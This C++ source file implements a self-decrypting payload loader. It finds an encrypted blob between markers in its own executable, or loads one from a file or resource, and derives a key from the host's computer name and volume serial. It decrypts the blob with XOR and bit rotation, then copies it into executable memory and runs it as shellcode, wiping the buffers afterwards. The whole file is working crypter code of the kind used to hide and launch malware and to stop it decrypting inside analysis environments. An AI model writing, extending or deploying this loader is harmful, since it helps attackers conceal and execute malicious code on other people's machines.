#include "Self_Decryptor.h"
#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <cstring>

namespace com {
namespace arenax3 {

constexpr unsigned char XOR_KEY[] = {
    0x7A, 0x3F, 0xA1, 0x56, 0x8C, 0x2E, 0xF4, 0x9B,
    0x1D, 0x63, 0xB8, 0x47, 0xD2, 0x05, 0xE9, 0x6A
};

constexpr size_t XOR_KEY_SIZE = sizeof(XOR_KEY) / sizeof(XOR_KEY[0]);

constexpr unsigned char SECTION_MARKER[] = {
    0x41, 0x58, 0x33, 0x5F, 0x45, 0x4E, 0x43, 0x52,
    0x59, 0x50, 0x54, 0x45, 0x44, 0x5F, 0x53, 0x45,
    0x43, 0x54, 0x49, 0x4F, 0x4E, 0x5F, 0x53, 0x54,
    0x41, 0x52, 0x54, 0x5F, 0x4D, 0x41, 0x52, 0x4B
};

constexpr size_t SECTION_MARKER_SIZE = sizeof(SECTION_MARKER) / sizeof(SECTION_MARKER[0]);

constexpr unsigned char SECTION_END_MARKER[] = {
    0x41, 0x58, 0x33, 0x5F, 0x45, 0x4E, 0x43, 0x52,
    0x59, 0x50, 0x54, 0x45, 0x44, 0x5F, 0x53, 0x45,
    0x43, 0x54, 0x49, 0x4F, 0x4E, 0x5F, 0x45, 0x4E,
    0x44, 0x5F, 0x4D, 0x41, 0x52, 0x4B, 0x45, 0x52
};

constexpr size_t SECTION_END_MARKER_SIZE = sizeof(SECTION_END_MARKER) / sizeof(SECTION_END_MARKER[0]);

Self_Decryptor::Self_Decryptor() 
    : m_encryptedPayload()
    , m_decryptionKey()
    , m_isInitialized(false)
    , m_validationHash(0)
{
    deriveKeyFromMachine();
}

Self_Decryptor::~Self_Decryptor() {
    secureWipe();
}

bool Self_Decryptor::initialize() {
    if (m_isInitialized) {
        return true;
    }

    if (!extractEncryptedSection()) {
        return false;
    }

    if (!validatePayloadIntegrity()) {
        secureWipe();
        return false;
    }

    m_isInitialized = true;
    return true;
}

bool Self_Decryptor::decrypt(std::vector<unsigned char>& outputBuffer) {
    if (!m_isInitialized) {
        if (!initialize()) {
            return false;
        }
    }

    if (m_encryptedPayload.empty()) {
        return false;
    }

    outputBuffer.clear();
    outputBuffer.resize(m_encryptedPayload.size());

    size_t keySize = m_decryptionKey.size();
    if (keySize == 0) {
        return false;
    }

    for (size_t i = 0; i < m_encryptedPayload.size(); ++i) {
        unsigned char keyByte = m_decryptionKey[i % keySize];
        unsigned char xoredByte = m_encryptedPayload[i] ^ keyByte;
        unsigned char transposedByte = ((xoredByte << 3) | (xoredByte >> 5)) & 0xFF;
        outputBuffer[i] = transposedByte ^ XOR_KEY[i % XOR_KEY_SIZE];
    }

    return true;
}

bool Self_Decryptor::decryptInPlace(void* destination, size_t maxSize) {
    if (!m_isInitialized || destination == nullptr || maxSize == 0) {
        return false;
    }

    std::vector<unsigned char> decryptedData;
    if (!decrypt(decryptedData)) {
        return false;
    }

    if (decryptedData.size() > maxSize) {
        secureWipeBuffer(decryptedData.data(), decryptedData.size());
        return false;
    }

    std::memcpy(destination, decryptedData.data(), decryptedData.size());
    secureWipeBuffer(decryptedData.data(), decryptedData.size());
    
    return true;
}

bool Self_Decryptor::executeDecrypted() {
    std::vector<unsigned char> decryptedPayload;
    if (!decrypt(decryptedPayload)) {
        return false;
    }

    void* execMemory = VirtualAlloc(
        nullptr,
        decryptedPayload.size(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (execMemory == nullptr) {
        secureWipeBuffer(decryptedPayload.data(), decryptedPayload.size());
        return false;
    }

    std::memcpy(execMemory, decryptedPayload.data(), decryptedPayload.size());
    secureWipeBuffer(decryptedPayload.data(), decryptedPayload.size());

    DWORD oldProtect;
    VirtualProtect(execMemory, decryptedPayload.size(), PAGE_EXECUTE_READ, &oldProtect);

    FlushInstructionCache(GetCurrentProcess(), execMemory, decryptedPayload.size());

    typedef void (*PayloadFunc)();
    PayloadFunc func = reinterpret_cast<PayloadFunc>(execMemory);
    
    __try {
        func();
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        VirtualFree(execMemory, 0, MEM_RELEASE);
        return false;
    }

    VirtualFree(execMemory, 0, MEM_RELEASE);
    return true;
}

bool Self_Decryptor::isPayloadReady() const {
    return m_isInitialized && !m_encryptedPayload.empty();
}

size_t Self_Decryptor::getPayloadSize() const {
    return m_encryptedPayload.size();
}

void Self_Decryptor::setDecryptionKey(const std::vector<unsigned char>& customKey) {
    m_decryptionKey = customKey;
}

bool Self_Decryptor::loadPayloadFromFile(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        return false;
    }

    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    if (fileSize <= 0) {
        file.close();
        return false;
    }

    m_encryptedPayload.resize(static_cast<size_t>(fileSize));
    
    if (!file.read(reinterpret_cast<char*>(m_encryptedPayload.data()), fileSize)) {
        m_encryptedPayload.clear();
        file.close();
        return false;
    }

    file.close();
    return true;
}

bool Self_Decryptor::loadPayloadFromMemory(const void* data, size_t size) {
    if (data == nullptr || size == 0) {
        return false;
    }

    m_encryptedPayload.resize(size);
    std::memcpy(m_encryptedPayload.data(), data, size);
    
    return true;
}

bool Self_Decryptor::loadPayloadFromResource(int resourceId) {
    HMODULE hModule = GetModuleHandle(nullptr);
    if (hModule == nullptr) {
        return false;
    }

    HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
    if (hResource == nullptr) {
        return false;
    }

    HGLOBAL hGlobal = LoadResource(hModule, hResource);
    if (hGlobal == nullptr) {
        return false;
    }

    DWORD resourceSize = SizeofResource(hModule, hResource);
    if (resourceSize == 0) {
        return false;
    }

    void* resourceData = LockResource(hGlobal);
    if (resourceData == nullptr) {
        return false;
    }

    return loadPayloadFromMemory(resourceData, static_cast<size_t>(resourceSize));
}

void Self_Decryptor::clearPayload() {
    secureWipe();
}

bool Self_Decryptor::verifyDecryptionKey(const std::vector<unsigned char>& keyToVerify) const {
    if (!m_isInitialized || m_encryptedPayload.empty()) {
        return false;
    }

    std::vector<unsigned char> originalKey = m_decryptionKey;
    const_cast<Self_Decryptor*>(this)->m_decryptionKey = keyToVerify;

    std::vector<unsigned char> testDecrypt;
    bool success = decrypt(testDecrypt);

    const_cast<Self_Decryptor*>(this)->m_decryptionKey = originalKey;

    if (!success || testDecrypt.empty()) {
        return false;
    }

    unsigned long long computedHash = computeChecksum(testDecrypt.data(), testDecrypt.size());
    secureWipeBuffer(testDecrypt.data(), testDecrypt.size());

    return computedHash == m_validationHash;
}

unsigned long long Self_Decryptor::computeChecksum(const void* data, size_t size) const {
    if (data == nullptr || size == 0) {
        return 0;
    }

    unsigned long long hash = 0x1505;
    const unsigned char* bytes = static_cast<const unsigned char*>(data);

    for (size_t i = 0; i < size; ++i) {
        hash = ((hash << 5) + hash) + bytes[i];
        hash ^= (hash >> 16);
    }

    return hash;
}

void Self_Decryptor::deriveKeyFromMachine() {
    m_decryptionKey.clear();

    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD nameSize = MAX_COMPUTERNAME_LENGTH + 1;
    
    if (GetComputerNameA(computerName, &nameSize)) {
        for (DWORD i = 0; i < nameSize && computerName[i] != '\0'; ++i) {
            m_decryptionKey.push_back(static_cast<unsigned char>(computerName[i]));
        }
    }

    DWORD volumeSerialNumber = 0;
    if (GetVolumeInformationA("C:\\", nullptr, 0, &volumeSerialNumber, nullptr, nullptr, nullptr, 0)) {
        unsigned char* serialBytes = reinterpret_cast<unsigned char*>(&volumeSerialNumber);
        for (int i = 0; i < sizeof(DWORD); ++i) {
            m_decryptionKey.push_back(serialBytes[i] ^ XOR_KEY[i % XOR_KEY_SIZE]);
        }
    }

    for (size_t i = 0; i < XOR_KEY_SIZE; ++i) {
        m_decryptionKey.push_back(XOR_KEY[i] ^ 0xAA);
    }

    if (m_decryptionKey.size() < 32) {
        size_t originalSize = m_decryptionKey.size();
        m_decryptionKey.resize(32);
        for (size_t i = originalSize; i < 32; ++i) {
            m_decryptionKey[i] = XOR_KEY[i % XOR_KEY_SIZE] ^ static_cast<unsigned char>(i);
        }
    }
}

bool Self_Decryptor::extractEncryptedSection() {
    HMODULE hModule = GetModuleHandle(nullptr);
    if (hModule == nullptr) {
        return false;
    }

    MODULEINFO moduleInfo;
    if (!GetModuleInformation(GetCurrentProcess(), hModule, &moduleInfo, sizeof(moduleInfo))) {
        return false;
    }

    unsigned char* moduleBase = static_cast<unsigned char*>(moduleInfo.lpBaseOfDll);
    DWORD moduleSize = moduleInfo.SizeOfImage;

    const unsigned char* sectionStart = findPattern(
        moduleBase,
        moduleSize,
        SECTION_MARKER,
        SECTION_MARKER_SIZE
    );

    if (sectionStart == nullptr) {
        return false;
    }

    const unsigned char* payloadStart = sectionStart + SECTION_MARKER_SIZE;
    DWORD remainingSize = moduleSize - static_cast<DWORD>(payloadStart - moduleBase);

    const unsigned char* sectionEnd = findPattern(
        payloadStart,
        remainingSize,
        SECTION_END_MARKER,
        SECTION_END_MARKER_SIZE
    );

    if (sectionEnd == nullptr) {
        return false;
    }

    size_t payloadSize = sectionEnd - payloadStart;
    
    if (payloadSize == 0) {
        return false;
    }

    m_encryptedPayload.assign(payloadStart, payloadStart + payloadSize);

    m_validationHash = computeChecksum(m_encryptedPayload.data(), m_encryptedPayload.size());

    return true;
}

const unsigned char* Self_Decryptor::findPattern(
    const unsigned char* data,
    size_t dataSize,
    const unsigned char* pattern,
    size_t patternSize) const
{
    if (data == nullptr || pattern == nullptr || patternSize == 0 || dataSize < patternSize) {
        return nullptr;
    }

    for (size_t i = 0; i <= dataSize - patternSize; ++i) {
        bool found = true;
        for (size_t j = 0; j < patternSize; ++j) {
            if (data[i + j] != pattern[j]) {
                found = false;
                break;
            }
        }
        if (found) {
            return &data[i];
        }
    }

    return nullptr;
}

bool Self_Decryptor::validatePayloadIntegrity() const {
    if (m_encryptedPayload.empty()) {
        return false;
    }

    unsigned long long currentHash = computeChecksum(m_encryptedPayload.data(), m_encryptedPayload.size());
    return currentHash == m_validationHash;
}

void Self_Decryptor::secureWipe() {
    if (!m_encryptedPayload.empty()) {
        secureWipeBuffer(m_encryptedPayload.data(), m_encryptedPayload.size());
        m_encryptedPayload.clear();
    }
    
    if (!m_decryptionKey.empty()) {
        secureWipeBuffer(m_decryptionKey.data(), m_decryptionKey.size());
        m_decryptionKey.clear();
    }

    m_validationHash = 0;
    m_isInitialized = false;
}

void Self_Decryptor::secureWipeBuffer(void* buffer, size_t size) {
    if (buffer == nullptr || size == 0) {
        return;
    }

    volatile unsigned char* ptr = static_cast<volatile unsigned char*>(buffer);
    
    for (size_t i = 0; i < size; ++i) {
        ptr[i] = 0xFF;
    }
    
    for (size_t i = 0; i < size; ++i) {
        ptr[i] = 0x00;
    }
    
    for (size_t i = 0; i < size; ++i) {
        ptr[i] = static_cast<unsigned char>(i & 0xFF);
    }
    
    for (size_t i = 0; i < size; ++i) {
        ptr[i] = 0x00;
    }
}

unsigned long long Self_Decryptor::getValidationHash() const {
    return m_validationHash;
}

bool Self_Decryptor::selfTest() {
    std::vector<unsigned char> testData = {0x48, 0x65, 0x6C, 0x6C, 0x6F};
    
    std::vector<unsigned char> originalKey = m_decryptionKey;
    std::vector<unsigned char> originalPayload = m_encryptedPayload;
    bool originalState = m_isInitialized;
    
    m_encryptedPayload = testData;
    deriveKeyFromMachine();
    m_isInitialized = true;
    
    std::vector<unsigned char> decrypted;
    bool success = decrypt(decrypted);
    
    m_decryptionKey = originalKey;
    m_encryptedPayload = originalPayload;
    m_isInitialized = originalState;
    
    return success && !decrypted.empty();
}

} // namespace arenax3
} // namespace com